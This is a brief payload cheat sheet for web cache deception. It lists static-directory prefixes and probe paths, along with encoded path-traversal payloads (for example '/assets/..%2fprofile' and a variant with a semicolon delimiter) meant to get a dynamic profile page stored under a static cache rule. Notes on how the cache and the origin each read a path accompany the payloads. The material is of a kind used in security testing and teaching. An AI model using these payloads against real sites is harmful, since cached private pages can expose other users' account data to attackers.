# Static Directory Cache Rule Payloads

## Common Prefixes

```text
/static
```

```text
/assets
```

```text
/scripts
```

```text
/images
```

```text
/resources
```

---

## Directory Rule Testing

```text
/assets/aaa
```

```text
/static/aaa
```

If arbitrary resources under the prefix are cached, investigate whether the prefix itself is the cache rule.

---

## Origin Normalization Candidate

```text
/assets/..%2fprofile
```

Expected conceptual interpretation:

```text
Cache:
/assets/..%2fprofile
```

```text
Origin:
/profile
```

---

## Generic Pattern

```text
/<static-directory-prefix>/..%2f<dynamic-path>
```

---

## Combined Delimiter Variant

```text
/profile;%2f%2e%2e%2fstatic
```

Potential interpretation:

```text
Origin:
/profile
```

```text
Cache:
/static
```

---

## Important

Confirm that the response is cached because of the directory prefix rather than another rule such as a file extension.